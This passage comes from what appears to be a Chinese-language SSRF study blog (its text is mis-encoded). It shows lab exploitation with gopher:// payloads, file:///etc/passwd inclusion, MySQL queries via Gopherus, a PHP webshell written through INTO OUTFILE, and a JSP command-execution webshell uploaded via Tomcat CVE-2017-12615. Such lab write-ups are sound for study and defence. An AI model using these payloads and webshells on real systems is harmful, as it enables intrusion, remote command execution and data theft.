¹æ®æºç ç¼–å†™å¦ä¸€ä¸ªPOSTæäº¤çš„å†…å®¹submitï¼Œè¿™éƒ¨åˆ†å¯çœç•¥</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;submit&quot;</span><br><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span>;<span class="hljs-attr">charset</span><span class="hljs-operator">=</span>UTF-<span class="hljs-number">8</span><br><br>ä¸Šä¼ <br></code></pre></td></tr></table></figure><p>æœ€åå†ä½¿ç”¨ä¸€æ¬¡åˆ†ç•Œçº¿ï¼Œå¹¶ä¸”æœ€ååŠ ä¸Šä¿©å‡å·</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">--</span><span class="hljs-comment">$&#123;Boundary&#125;</span><span class="hljs-literal">--</span><br></code></pre></td></tr></table></figure><p>å®Œæ•´çš„payloadä¸º</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: multipart/form-<span class="hljs-class"><span class="hljs-keyword">data</span>; boundary=$&#123;<span class="hljs-type">Boundary</span>&#125;</span><br><br>--$&#123;<span class="hljs-type">Boundary</span>&#125;<span class="hljs-comment">--</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;upload_file&quot;; filename=&quot;phpinfo.php&quot;</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: image/jpeg<br><br>&lt;?php phpinfo();?&gt;<br><br>--$&#123;<span class="hljs-type">Boundary</span>&#125;<span class="hljs-comment">--</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Disposition</span>: form-<span class="hljs-class"><span class="hljs-keyword">data</span>; name=&quot;submit&quot;</span><br><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: text/plain;charset=<span class="hljs-type">UTF</span>-<span class="hljs-number">8</span><br><br>ä¸Šä¼ <br>--$&#123;<span class="hljs-type">Boundary</span>&#125;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><h4 id="æ„é€ å‡ºå®Œæ•´çš„gopheræäº¤æ•°æ®"><a href="#æ„é€ å‡ºå®Œæ•´çš„gopheræäº¤æ•°æ®" class="headerlink" title="æ„é€ å‡ºå®Œæ•´çš„gopheræäº¤æ•°æ®"></a>æ„é€ å‡ºå®Œæ•´çš„<code>gopher</code>æäº¤æ•°æ®</h4><p>å¯ä»¥é€šè¿‡æŠ“åŒ…è·å–æ•°æ®è¿›è¡Œæ„é€ </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Pass-01/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.14<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryy0nfsJQPiWB4Y9qs<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>306<br><br><span class="language-php">------WebKitFormBoundarysogmETe5AIRzminC</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;phpinfo.php&quot;</span></span><br><span class="language-php">Content-Type: image/jpeg</span><br><span class="language-php"></span><br><span class="language-php"> <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundarysogmETe5AIRzminC</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">ä¸Šä¼ </span><br><span class="language-php">------WebKitFormBoundarysogmETe5AIRzminC--</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>gopher</code>ä¼ªåè®®è¿›è¡Œä¸Šä¼ </p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423201834987.png" alt="image-20250423201834987"></p><p>è¿›è¡Œä¸¤æ¬¡URLç¼–ç åæäº¤ï¼Œä¼šå¾—åˆ°æ–‡ä»¶è·¯å¾„ï¼ˆä¸Šé¢çš„é‚£ä¸ªpayloadä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼ ä¹‹åå¾—ä¸åˆ°æ–‡ä»¶è·¯å¾„ï¼Œè¿™ç›´æ¥ç”¨çš„è§†é¢‘é‡Œçš„ï¼‰</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423204852849.png" alt="image-20250423204852849"></p><p>æœ€åå¯ä»¥ä½¿ç”¨<code>http</code>ä¼ªåè®®æŸ¥çœ‹ä¸Šä¼ çš„æ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.250</span>.<span class="hljs-number">250.14</span><span class="hljs-regexp">/upload/</span>phpinfo.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423205317234.png" alt="image-20250423205317234"></p><h3 id="ä½¿ç”¨SSRFè¿›è¡Œæ–‡ä»¶åŒ…å«"><a href="#ä½¿ç”¨SSRFè¿›è¡Œæ–‡ä»¶åŒ…å«" class="headerlink" title="ä½¿ç”¨SSRFè¿›è¡Œæ–‡ä»¶åŒ…å«"></a>ä½¿ç”¨SSRFè¿›è¡Œæ–‡ä»¶åŒ…å«</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.14/include.php</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423211557880.png" alt="image-20250423211557880"></p><h4 id="ç›´æ¥ä½¿ç”¨ä¼ªåè®®åŒ…å«è¯»å–æ–‡ä»¶"><a href="#ç›´æ¥ä½¿ç”¨ä¼ªåè®®åŒ…å«è¯»å–æ–‡ä»¶" class="headerlink" title="ç›´æ¥ä½¿ç”¨ä¼ªåè®®åŒ…å«è¯»å–æ–‡ä»¶"></a>ç›´æ¥ä½¿ç”¨ä¼ªåè®®åŒ…å«è¯»å–æ–‡ä»¶</h4><p>å¯ä»¥ç›´æ¥æäº¤ä¸€ä¸ªå‚æ•°å°±èƒ½è¯»å–æ–‡ä»¶</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">172.250</span><span class="hljs-number">.250</span><span class="hljs-number">.14</span>/<span class="hljs-built_in">include</span>.php?<span class="hljs-built_in">file</span>=<span class="hljs-built_in">file</span>:<span class="hljs-comment">///etc/passwd</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423211807854.png" alt="image-20250423211807854"></p><p>å¦‚æœä½¿ç”¨<code>data://</code>è¿™ç§ä¼ªåè®®ï¼Œå«æœ‰ç©ºæ ¼çš„è¦ä½¿ç”¨URLç¼–ç ï¼Œæˆ–è€…ä½¿ç”¨<code>+</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">http://172.250.250.14/include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span>system(<span class="hljs-string">&#x27;id&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423212036497.png" alt="image-20250423212036497"></p><p>å¦‚æœæ˜¯POSTæäº¤çš„å‚æ•°ï¼Œå°±å’Œå‰é¢çš„æ¼æ´åˆ©ç”¨ä¸€æ ·ä½¿ç”¨<code>gopher</code>ä¼ªåè®®</p><h2 id="SSRFä¹‹å¯¹MySQLè¿›è¡Œæœªæˆæƒæ“ä½œ"><a href="#SSRFä¹‹å¯¹MySQLè¿›è¡Œæœªæˆæƒæ“ä½œ" class="headerlink" title="SSRFä¹‹å¯¹MySQLè¿›è¡Œæœªæˆæƒæ“ä½œ"></a>SSRFä¹‹å¯¹MySQLè¿›è¡Œæœªæˆæƒæ“ä½œ</h2><h3 id="ä½¿ç”¨SSRFå¯¹MySQLè¿›è¡ŒæœªæˆæƒæŸ¥è¯¢"><a href="#ä½¿ç”¨SSRFå¯¹MySQLè¿›è¡ŒæœªæˆæƒæŸ¥è¯¢" class="headerlink" title="ä½¿ç”¨SSRFå¯¹MySQLè¿›è¡ŒæœªæˆæƒæŸ¥è¯¢"></a>ä½¿ç”¨SSRFå¯¹MySQLè¿›è¡ŒæœªæˆæƒæŸ¥è¯¢</h3><p>è¿™é‡Œçš„æœªæˆæƒæ˜¯MySQLçš„æ•°æ®åº“æ²¡æœ‰è®¾ç½®å¯†ç ï¼Œå¹¶ä¸”å…è®¸ç”¨æˆ·ç™»å½•æ•°æ®åº“</p><h4 id="å¦‚ä½•ä¸MySQLè¿›è¡Œæ•°æ®é€šè®¯"><a href="#å¦‚ä½•ä¸MySQLè¿›è¡Œæ•°æ®é€šè®¯" class="headerlink" title="å¦‚ä½•ä¸MySQLè¿›è¡Œæ•°æ®é€šè®¯"></a>å¦‚ä½•ä¸MySQLè¿›è¡Œæ•°æ®é€šè®¯</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">-</span>urootè¿›å…¥MySQL<br><span class="hljs-keyword">show</span> databases;æŸ¥çœ‹æ•°æ®åº“<br></code></pre></td></tr></table></figure><p>é€šè¿‡SSRFæŸ¥çœ‹æ•°æ®åº“<code>security</code>ä¸‹è¡¨<code>user</code>çš„å†…å®¹</p><h4 id="æŠ“å–æœ¬åœ°MySQLæ•°æ®åº“é€šè®¯å†…å®¹æ„é€ payload"><a href="#æŠ“å–æœ¬åœ°MySQLæ•°æ®åº“é€šè®¯å†…å®¹æ„é€ payload" class="headerlink" title="æŠ“å–æœ¬åœ°MySQLæ•°æ®åº“é€šè®¯å†…å®¹æ„é€ payload"></a>æŠ“å–æœ¬åœ°MySQLæ•°æ®åº“é€šè®¯å†…å®¹æ„é€ payload</h4><p><strong>å·¥å…·ï¼š</strong><code>tcpdump</code>ã€<code>Wireshark</code></p><p>ä¹Ÿå¯ä»¥ç›´æ¥åªç”¨<code>Wireshark</code>æŠ“å–æ•°æ®åŒ…å¹¶è¿›è¡Œåå…­è¿›åˆ¶å±•ç¤ºï¼Œå†ç¼–ç¨‹URLç¼–ç è¿›è¡Œæäº¤</p><ul><li>å¼€å§‹æŠ“åŒ…ï¼Œç›‘å¬ lo å›ç¯åœ°å€æ¥å£ç½‘å¡çš„3306ç«¯å£ï¼Œ-wå†™å…¥æ–‡ä»¶<code>mysql.pcapng</code>ç”Ÿæˆåœ¨æ ¹ç›®å½•ä¸‹</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -i lo port <span class="hljs-number">3306</span> -w mysql.pcapng<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423224515084.png" alt="image-20250423224515084"></p><ul><li>å†™å…¥æŒ‡ä»¤</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mysql -h127.0.0.1 -uroot <span class="hljs-attribute">--ssl-mode</span>=DISABLED -e <span class="hljs-string">&quot;show databases;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423224444109.png" alt="image-20250423224444109"></p><p>ç„¶åå°±å¯ä»¥åœæ­¢ç›‘å¬ï¼Œå¹¶ä¸”å¯ä»¥åœ¨æ ¹ç›®å½•çœ‹åˆ°<code>mysql.pcapng</code>æ–‡ä»¶</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423224639293.png" alt="image-20250423224639293"></p><p>æŠŠæ–‡ä»¶å¤åˆ¶åˆ°æœ¬åœ°ï¼Œç”¨Wiresharkæ‰“å¼€ï¼Œæ‰¾åˆ°ä¸‰æ¬¡TCPæ¡æ‰‹ï¼Œå³é”®&#x3D;ã€‹è·Ÿè¸ªæµ&#x3D;ã€‹TCPæµ</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423224913559.png" alt="image-20250423224913559"></p><p>ä¼šå¾—åˆ°ä»¥ä¸‹æ•°æ®æµï¼Œçº¢è‰²çš„æ˜¯è‡ªå·±ä¸»æœºå‘ç»™MySQLæœåŠ¡å™¨çš„æ•°æ®æµï¼Œè“è‰²çš„æ˜¯æ¥æ”¶çš„</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423225102697.png" alt="image-20250423225102697"></p><p>æ„é€ POCçš„åªéœ€è¦çº¢è‰²éƒ¨åˆ†çš„ï¼Œæ‰€ä»¥è¦è¿›è¡Œè¿‡æ»¤</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423225255357.png" alt="image-20250423225255357"></p><p>è¿˜è¦æ”¹æˆåŸå§‹æ•°æ®</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423225332934.png" alt="image-20250423225332934"></p><p>æœ€åå¾—åˆ°çš„å°±æ˜¯è¦ä½¿ç”¨çš„æ„é€ POCçš„å†…å®¹</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423225410894.png" alt="image-20250423225410894"></p><p>å¯¹ä»¥ä¸Šæ•°æ®è¿˜è¦è¿›è¡Œä¸€äº›ä¿®æ”¹ï¼Œè¦å»æ‰æ¢è¡Œç¬¦ï¼Œè¿˜è¦å°†ASCIIç è½¬åŒ–ä¸ºURLç¼–ç </p><p>ASCIIç è½¬åŒ–ä¸ºURLç¼–ç çš„è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">results</span>(<span class="hljs-params">s</span>):<br>    a=[s[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">2</span>)]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;curl gopher://172.250.250.1:3306/_%&quot;</span>+<span class="hljs-string">&quot;%&quot;</span>.join(a)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    s=sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(results(s))<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423225852400.png" alt="image-20250423225852400"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423230019375.png" alt="image-20250423230019375"></p><p>å°†å¾—åˆ°çš„payloadåœ¨SSRFæœåŠ¡å™¨æäº¤ï¼Œå°±å¯ä»¥è·å¾—æ•°æ®åº“æŸ¥è¯¢ç»“æœ</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423230118363.png" alt="image-20250423230118363"></p><h4 id="ä½¿ç”¨å·¥å…·æ„é€ payload"><a href="#ä½¿ç”¨å·¥å…·æ„é€ payload" class="headerlink" title="ä½¿ç”¨å·¥å…·æ„é€ payload"></a>ä½¿ç”¨å·¥å…·æ„é€ payload</h4><p>æ‹‰å–å·¥å…·</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/tarunkant/Gopherus<br></code></pre></td></tr></table></figure><p>è¿›è¡Œæ”»å‡»</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cd Gopherus<br>python2<span class="hljs-number">.7</span> gopherus.py <span class="hljs-comment">--exploit mysql</span><br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424001659075.png" alt="image-20250424001659075"></p><p>æŠŠ<code>127.0.0.1</code>æ”¹æˆæœåŠ¡å™¨åœ°å€<code>172.250.250.1</code></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423233735101.png" alt="image-20250423233735101"></p><h3 id="ä½¿ç”¨SSRFå¯¹MySQLè¿›è¡Œæœªæˆæƒæ–‡ä»¶å†™å…¥"><a href="#ä½¿ç”¨SSRFå¯¹MySQLè¿›è¡Œæœªæˆæƒæ–‡ä»¶å†™å…¥" class="headerlink" title="ä½¿ç”¨SSRFå¯¹MySQLè¿›è¡Œæœªæˆæƒæ–‡ä»¶å†™å…¥"></a>ä½¿ç”¨SSRFå¯¹MySQLè¿›è¡Œæœªæˆæƒæ–‡ä»¶å†™å…¥</h3><p>æŸ¥çœ‹å†™å…¥æƒé™</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%secure%&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250423235910306.png" alt="image-20250423235910306"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424000044507.png" alt="image-20250424000044507"></p><p>æŸ¥çœ‹æºç ï¼Œä¼šå‘ç°ä¸‹é¢<code>secure_file_priv</code>è¿™é‡Œæ²¡æœ‰å€¼ï¼Œå°±æœ‰å†™å…¥æƒé™</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424000201569.png" alt="image-20250424000201569"></p><h4 id="ä½¿ç”¨å·¥å…·æ„é€ payload-1"><a href="#ä½¿ç”¨å·¥å…·æ„é€ payload-1" class="headerlink" title="ä½¿ç”¨å·¥å…·æ„é€ payload"></a>ä½¿ç”¨å·¥å…·æ„é€ payload</h4><p>ä½¿ç”¨<code>into outfile</code>ç”Ÿæˆæ–‡ä»¶<code>cmd.php</code>å¹¶å†™å…¥ä¸€å¥è¯</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/cmd.php&#x27;</span>;<br><br># å¦‚æœæ˜¯å®å¡”æ­å»ºçš„<br><span class="hljs-keyword">select</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/www/wwwroot/cmd.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424000628991.png" alt="image-20250424000628991"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424000850842.png" alt="image-20250424000850842"></p><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.1/cmd.php?cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424001000102.png" alt="image-20250424001000102"></p><h2 id="ä½¿ç”¨SSRFå¯¹tomcatæ–‡ä»¶å†™å…¥"><a href="#ä½¿ç”¨SSRFå¯¹tomcatæ–‡ä»¶å†™å…¥" class="headerlink" title="ä½¿ç”¨SSRFå¯¹tomcatæ–‡ä»¶å†™å…¥"></a>ä½¿ç”¨SSRFå¯¹tomcatæ–‡ä»¶å†™å…¥</h2><p>tomcatæ¼æ´ï¼šCVE-2017-12615</p><p>è¿™ä¸ªæ¼æ´çš„ä½œç”¨æ˜¯ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œç»•è¿‡éªŒè¯ç›´æ¥åœ¨ç›®æ ‡é¶æœºè¿›è¡Œæ–‡ä»¶ä¸Šä¼ </p><p>é»˜è®¤ç«¯å£æ˜¯8080</p><h3 id="è¦æ„é€ çš„POC"><a href="#è¦æ„é€ çš„POC" class="headerlink" title="è¦æ„é€ çš„POC"></a>è¦æ„é€ çš„POC</h3><p>å¤´éƒ¨ä¿¡æ¯</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424002709598.png" alt="image-20250424002709598"></p><p>ç„¶åæ„é€ ä¸€å¥è¯æœ¨é©¬å¡«å……åˆ°å¤´éƒ¨ä¿¡æ¯å</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424002759890.png" alt="image-20250424002759890"></p><p>å°†ä»¥ä¸Šä¸¤éƒ¨åˆ†åˆå¹¶åè¿›è¡ŒURLç¼–ç æäº¤</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/cmd.jsp/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.250.250.7:8080<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>460<br><br><span class="language-gradle">&lt;%</span><br><span class="language-gradle">String command = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);</span><br><span class="language-gradle"><span class="hljs-keyword">if</span>(command != <span class="hljs-keyword">null</span>)</span><br><span class="language-gradle">&#123;</span><br><span class="language-gradle">java.io.InputStream in=<span class="hljs-keyword">Runtime</span>.getRuntime().exec(command).getInputStream();</span><br><span class="language-gradle"><span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;</span><br><span class="language-gradle"><span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];</span><br><span class="language-gradle">out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="language-gradle"><span class="hljs-keyword">while</span>((a=in.<span class="hljs-keyword">read</span>(b))!=-<span class="hljs-number">1</span>)</span><br><span class="language-gradle">&#123;</span><br><span class="language-gradle">out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(b));</span><br><span class="language-gradle">&#125;</span><br><span class="language-gradle">out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="language-gradle">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-gradle">out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);</span><br><span class="language-gradle">&#125;</span><br><span class="language-gradle">%&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.7:8080</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424002953081.png" alt="image-20250424002953081"></p><p>å…ˆæäº¤<code>gopher</code>ä¼ªåè®®è¿›è¡ŒæŠ“åŒ…</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.250.250.7:8080/_</span><br></code></pre></td></tr></table></figure><p>åŠ å…¥POCï¼Œè¿›è¡Œä¸¤æ¬¡URLç¼–ç </p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424004605165.png" alt="image-20250424004605165"></p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424004643567.png" alt="image-20250424004643567"></p><p>è®¿é—®çœ‹çœ‹</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.250.250.7:8080/cmd.jsp</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424004720696.png" alt="image-20250424004720696"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸäº†ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://172.250.250.7:8080/cmd.jsp?cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250424004843016.png" alt="image-20250424004843016"></p><h2 id="ä½¿ç”¨SSRFå¯¹Redisæ¼æ´æœªæˆæƒæ“ä½œ"><a href="#ä½¿ç”¨SSRFå¯¹Redisæ¼æ´æœªæˆæƒæ“ä½œ" class="headerlink" title="ä½¿ç”¨SSRFå¯¹Redisæ¼æ´æœªæˆæƒæ“ä½œ"></a>ä½¿ç”¨SSRFå¯¹Redisæ¼æ´æœªæˆæƒæ“ä½œ</h2><h3 id="ä½¿ç”¨SSRFå¯¹RedisæœªæˆæƒWebshellå†™å…¥"><a href="#ä½¿ç”¨SSRFå¯¹RedisæœªæˆæƒWebshellå†™å…¥" class="headerlink" title="ä½¿ç”¨SSRFå¯¹RedisæœªæˆæƒWebshellå†™å…¥"></a>ä½¿ç”¨SSRFå¯¹Redisæœªæˆæƒ<code>Webshell</code>å†™å…¥</h3><p>å¦‚æœå¯¹æ–¹æœåŠ¡å™¨ä¸Šæœ‰ä¸€ä¸ªç½‘ç«™ï¼Œå¯ä»¥ä½¿ç”¨Redisæœªæˆæƒï¼Œå‘å¯¹æ–¹ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä»è€Œæ‹¿åˆ°å¯¹æ–¹çš„<code>Webshell</code></p><h4 id="åˆ©ç”¨é€»è¾‘"><a href="#åˆ©ç”¨é€»è¾‘" class="headerlink" 